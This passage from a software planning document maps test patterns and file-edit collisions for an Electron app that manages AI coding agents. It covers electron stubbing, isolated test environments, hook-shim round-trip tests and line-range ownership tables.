stub, why injection wins over the stub, and what the stub deliberately does NOT do.
**Apply to:** every new test file, and to the electron-free claim in every new module header.

```js
/**
 * How `electron` is resolved for a module under test (issue #55).
 *
 * Twelve modules under src/main import `electron` at module scope, so merely loading one
 * for a unit test pulls it in. In plain Node that is never the Electron API: electron's
 * entry point resolves to the *path string* of the binary, and on a machine where the
 * binary was never downloaded — which is every CI runner, because we install with
 * `npm ci --ignore-scripts` — it throws "Electron failed to install correctly".
 *
 * That is not a cosmetic failure. A file that cannot load is a file whose tests silently
 * do not exist, which is why the three CI platforms used to collect three different test
 * counts (357 / 343 / 287) and "the suite passes" meant something different on each.
 *
 * A test that injects the API into require.cache before calling loadTs must still win
 * (test/config-secrets.test.cjs does exactly that, and needs its own userData dir). Only
 * when there is no injection do we fall back to the stub below, whose job is to let modules
 * LOAD — not to make them behave. Anything a test needs to assert on should be injected,
 * not reached through the stub.
 */
```

**⚠️ RESEARCH L-03 correction to CONTEXT's `<code_context>`:** `db.ts:19` IS `import { app } from
'electron'` and `hooks.ts` uses `Notification` as a value. Both need the stub or an injection. The
require.cache injection to copy is `test/boot-floor.test.cjs:31-55`:

```js
let userData;
const electronPath = require.resolve('electron');
require.cache[electronPath] = {
  id: electronPath,
  filename: electronPath,
  loaded: true,
  exports: {
    app: {
      getPath: (name) => (name === 'userData' ? userData : path.join(userData, name)),
      getAppPath: () => userData,
      isPackaged: false,
      getVersion: () => '0.0.0-test'
    },
    ...
    // hooks.ts's HookServer imports `Notification` as a value (Notification.isSupported()).
    Notification: class { show() { /* noop */ } static isSupported() { return false; } }
  }
};
```

### 5. Per-test isolated `(userData, harnessHome)`

**Source:** `test/boot-floor.test.cjs:59-85`. Every new test file in this phase copies this helper.

```js
function floorEnv(t) {
  userData = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'md-boot-floor-')));
  const harnessHome = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'md-boot-floor-home-')));
  fs.writeFileSync(
    path.join(userData, 'config.json'),
    JSON.stringify({ harnessHome, slackEnabled: false, webhookTriggers: [], notifications: false }, null, 2),
    'utf8'
  );
  const thisUserData = userData;
  t.after(() => {
    try { fs.rmSync(thisUserData, { recursive: true, force: true }); } catch { /* best-effort */ }
    try { fs.rmSync(harnessHome, { recursive: true, force: true }); } catch { /* best-effort */ }
  });
  return { userData: thisUserData, harnessHome };
}
```

**Liveness-assertion style** (`test/boot-floor.test.cjs:193-197`) — assert the field, never "the
promise resolved":

```js
  assert.equal(floor.persist.isOpen, true, 'persist.open() did not run inside bootFloor');
```

**Connect, never stat** (`test/boot-floor.test.cjs:183-190`, Pitfall 3):

```js
  // Connect, never stat: a win32 named pipe has no filesystem entry.
  const sock = floor.hive.sockPath();
  assert.ok(sock, 'hookServer has no socket path to connect to');
  await new Promise((resolve, reject) => {
    const c = net.createConnection(sock, () => { c.end(); resolve(); });
    c.once('error', reject);
  });
```

### 6. Real shim child → real HookServer (the ONLY model for GATE-03/GATE-05 integration tests)

**Source:** `test/hook-auth-roundtrip.test.cjs:65-125`. Pitfall 2's antidote: never construct the
payload by hand — read the shim command out of the agent's real `settings.json` and drive it as a
child process over stdin.

```js
function runShim(command, env, payload) {
  return new Promise((resolve) => {
    const c = spawn(command, { shell: true, env });
    let stderr = '';
    c.stderr.on('data', (d) => { stderr += d; });
    c.on('close', (code) => resolve({ code, stderr }));
    // The no-token case makes the shim exit before it drains stdin; an EPIPE
    // there is the shim behaving correctly, not a fixture failure.
    c.stdin.on('error', () => { /* the child never read stdin */ });
    c.stdin.end(payload);
  });
}

async function floorWithHookServer(t) {
  const home = tmpHome(t);
  const hive = new HiveManager(() => home);
  await hive.ensureAgent({ id: 'a1', name: 'A', provider: 'claude', cwd: home });

  const server = new HookServer(hive, () => null, () => ({}));
  server.start();
  t.after(() => server.stop());

  const settings = JSON.parse(
    fs.readFileSync(path.join(home, 'hive/agents/a1/settings.json'), 'utf8')
  );
  const command = settings.hooks.Stop[0].hooks[0].command;
  const sock = path.join(home, 'hive', 'hooks.sock');
  return { home, hive, server, command, sock };
}
```

The env the child gets — GATE-03/05's tests mint through the real server exactly as `pty.ts` does
(`hook-auth-roundtrip.test.cjs:104-112`):

```js
  const env = {
    ...process.env,
    HIVE_SOCK: sock,
    // a1's OWN token, minted through the real server exactly as pty.ts does at
    // spawn. There is no floor-wide value to reach for any more, and that is the
    // point: this env is what agent a1 — and only agent a1 — can read.
    HIVE_SOCK_TOKEN: server.mintToken('a1'),
    AGENT_ID: 'a1',
    CLAUDE_TRANSCRIPT_PATH: transcript,
  };
```

And the observable-not-vacuous assertion style (`:120-125`):

```js
  assert.equal(
    server.transcriptPath('a1'), transcript,
    'the payload was delivered but NOT accepted — the shim is not sending sock_token, '
    + 'so authorized() dropped it and every hook on this floor is dead'
  );
```

Note `{ skip: !POSIX }` on both tests — a new POSIX-only test raises the baseline **7** skipped;
RESEARCH's skipped-count invariant says the SUMMARY must state the new number.

---

## Collision Map — the three files that cannot get one owner without serializing tracks

D-35 (`use_worktrees: false`, one owner per file per wave) makes this section the load-bearing part of
this document. Line ranges measured this session.

### A. `src/main/hive.ts` (2,821 lines) — 3 requirements

| Requirement | Region wanted | Measured lines | Distance from neighbours |
|---|---|---|---|
| **VIGIL-04** | `HumanQA` + `HiveTask` interfaces (`updatedAt`) | **`:110-152`** | — |
| **RECORD-05** | `.gitignore` seed `want` array (add `'restore.git/'`) | **`:782-796`** (the `want` array is `:782-792`; `'backups/'` at `:787`) | +630 from VIGIL-04 |
| **VIGIL-04** | main-side ledger mutators (`mutateTasks`, `addTask`, `patchTask`, `claim`, `done`) | **`:2141-2180`** | — |
| **RECORD-02** | `appendLog` (mirror into `PersistStore`) | **`:2485-2509`** (`LOG_ROTATE_BYTES` at `:323`) | **+305 from VIGIL-04's mutators** |

**Verdict:** VIGIL-04 (`:110-152` + `:2141-2180`) and RECORD-02 (`:323` + `:2485-2509`) and RECORD-05
(`:782-796`) are three **disjoint, non-adjacent regions** — closest gap is ~305 lines. Intra-file
region-splitting is *mechanically* safe here. But note `LOG_ROTATE_BYTES` sits at `:323`, only ~170
lines from VIGIL-04's `HiveTask` block, so RECORD-02's owner should touch `:323` only if the retention
change actually needs it (it does not — the rotate stays per Pattern 5).
**Recommendation:** per-wave ownership (cleaner reading of D-35). If the planner splits intra-file,
name the exact line ranges in each plan and forbid drive-by edits outside them.

### B. `src/main/index.ts` (4,980 lines) — 2 requirements

| Requirement | Region wanted | Measured lines |
|---|---|---|
| **GATE-05** | `openPhoneAsks` (merge the approval registry) | **`:1219-1236`**; its wiring at **`:1315-1323`**; `answerPhoneAsk` begins `:1238` |
| **VIGIL-01** | watchdog wiring / `electronDeps()`'s `notify` | **`:4763-4795`** (the `notify` thunk is `:4780-4783`; a second `new Notification` site at `:4159`) |

**Verdict:** **3,527 lines apart, zero overlap.** Intra-file region-splitting is safe here even in the
same wave. The only shared risk is a whole-file formatter run — forbid one.
**Note:** VIGIL-01's *timer* belongs in `floor/boot.ts`, not `index.ts` (Pattern 7 + D-25). If the plan
keeps the watchdog entirely inside `boot.ts` and reuses the already-wired `deps.notify`, **`index.ts`
needs no VIGIL-01 edit at all** and this collision dissolves.

### C. `test/repo-claims.test.cjs` (1,641 lines) — 2+ requirements

| Requirement | Region wanted | Measured lines |
|---|---|---|
| **GATE-03** | `MARKER_LEDGER` (pi + OpenCode markers) | **`:1291-1298`** (the object literal), `LIVE_UNVERIFIED_TOTAL` at **`:1307`** |
| **GATE-04** | `MARKER_LEDGER` (codex-sandbox marker, if one is added) | same object |
| both | the file-set / total / per-engine assertions | **`:1419-1454`** |

Measured ledger at HEAD — this is a **four-way pin** (per-file counts, repo total, committed file set,
per-engine lower bound); all four must be reconciled in the SAME commit as any marker change:

```js
const MARKER_LEDGER = {
  'src/main/hive.ts': 3,
  'src/main/hiveProvisioning.ts': 5,
  'src/main/hiveTemplates.ts': 3,
  'src/main/index.ts': 1,
  'src/main/webhook.ts': 3,
  'src/shared/agentProvider.ts': 3
};
```

```js
const LIVE_UNVERIFIED_TOTAL = 18;
```

**Verdict:** GATE-03 and GATE-04 both edit the SAME object literal at `:1291-1298`. This is a genuine
conflict, not a distance problem.
**Recommendation:** either (a) make `test/repo-claims.test.cjs` a **phase-wide single-owner file** with
one plan responsible for the final ledger reconciliation at the end of the phase, or (b) put GATE-03's
and GATE-04's marker additions in **one plan**. (a) is the cleaner fit with the wave model and matches
how plan 02-12 closed Phase 2.
**Re-measure command the file itself prescribes** (`repo-claims.test.cjs:1287-1289`):

```
grep -ro 'LIVE-UNVERIFIED' src/ | cut -d: -f1 | sort | uniq -c
```

### Secondary collisions (lower risk, still name an owner)

| File | Requirements | Regions | Verdict |
|---|---|---|---|
| `src/main/hooks.ts` | GATE-03 (`:801-859`, `:860-985`, `:1368-1381`), GATE-05 (`:1383-1399`, `:467`, `:1188+` new branch), RECORD-01 (`:1188-1200` writer) | overlapping and adjacent | **ONE owner, D-01. Not splittable.** |
| `src/main/hiveTemplates.ts` | GATE-05 shims (`:298-347`, `:364-412`, `:730-795`), GATE-03 pi/opencode (`:425-465`, `:466-500`), VIGIL-04 `TASK_CLI` (`:24`) | `:24` vs `:298+` are ~275 lines apart | Track A owns `:291-800`; VIGIL-04 owns `:24-290`. Splittable, but state the boundary. |
| `src/main/pty.ts` | GATE-02 (`:745-800`), VIGIL-03 (`:826-840`) | 75 lines apart, different functions | Splittable; prefer per-wave ownership (GATE-02 is S-7's "first or last, never middle"). |
| `src/main/config.ts` | GATE-03 host allowlist, GATE-04 `commandForAutoMode:1058`, VIGIL-01 thresholds | three distinct regions | Splittable. `HEARTBEAT_MISSION` at `:95-107` is READ-ONLY for VIGIL-01 (D-23). |
| `src/main/db.ts` | RECORD-01 + RECORD-02 | one `MIGRATIONS` array | **ONE owner, ONE migration (S-4).** Not splittable. |
| `src/main/floor/boot.ts` | VIGIL-01 timer, RECORD-05 timer | both add to `SHUTDOWN_STEPS:928-956` and the `let` block `:150-180` | Same two spots. **ONE owner per wave**, or one plan adds both timers. |
| `src/main/config.ts` + `src/renderer/src/store/config.ts` | GATE-04 only | `:1058` and `:430` | **Must be the SAME owner in the SAME wave (L-08)** — different tsconfig projects, typecheck cannot see the drift. |

---

## No Analog Found

| File / concern | Role | Data flow | Closest existing | Why it differs |
|---|---|---|---|---|
| **Shim-side poll loop** (inside `HOOK_SHIM` / `GROK_HOOK_SHIM` / `AGY_HOOK_SHIM`) | embedded client script | request-response, retried | `src/main/hiveTemplates.ts:340-347` (single-shot connect + read) and `:314-322` (status-mode fire-and-forget) | **NO ANALOG — closest is `HOOK_SHIM`'s single connect at `hiveTemplates.ts:340-347`, differs because no shim in this repo has ever re-connected.** Every one of the seven is one connection, one reply, exit. The retry/deadline loop is genuinely new code with no in-repo precedent. Use RESEARCH § Pattern 3's sketch and the `c.on('error', () => process.exit(0))` line (which MUST be preserved verbatim, D-08 clause 3). |
| **`ApprovalPoll` server branch** inside `HookServer.handle` | server branch | request-response | `hooks.ts:1368-1399` (the PreToolUse arms) | Partial. The branch *shape* is exactly the PreToolUse arm's, but no existing hook event is a **stateful poll keyed on an id that main minted**. Every current event is stateless per connection. Treat the arm shape as the analog and the statefulness as new. |
| **`--add-dir` argv splice for codex** | preset | config | `agentProvider.ts:271-272` (`autoModeFlag`/`autoFlag`) and `config.ts:1064-1068` | Partial. The splice sites exist, but every current flag is **static text**; `--add-dir <agentDir>` is the first **per-agent, path-valued** flag. `hive.ts:1017`'s `env.CODEX_HOME = installCodexHooks(...)` is the nearest per-agent-path precedent — but it is an env var, not an argv member, so the two splice sites (L-08) will need a per-agent value threaded to them for the first time. **This is the highest-uncertainty item in the phase and RESEARCH L-11 already flags it as a Wave-0 spike.** |

Everything else in this phase has a real analog. RESEARCH's own conclusion holds: *"every single one of
Phase 4's eleven requirements has a majority of its mechanism already in this repo."*

---

## Metadata

**Analog search scope:** `src/main/**`, `src/main/floor/**`, `src/shared/**`,
`src/renderer/src/{hooks,components,store}/**`, `test/**`
**Files opened and excerpted this session:** 26 source + 5 test = **31**
**Files enumerated (line counts / greps only):** 12
**Baseline referenced (not re-run in this session):** RESEARCH @ `ad3d2f7` — 805 tests / 798 pass /
0 fail / 7 skipped; typecheck 0 errors. **MEASUREMENT UNAVAILABLE for `e504735`** — no test run was
executed by this pattern-mapping pass; the planner must re-measure at execution start per D-37's
standing rule.
**Pattern extraction date:** 2026-08-25
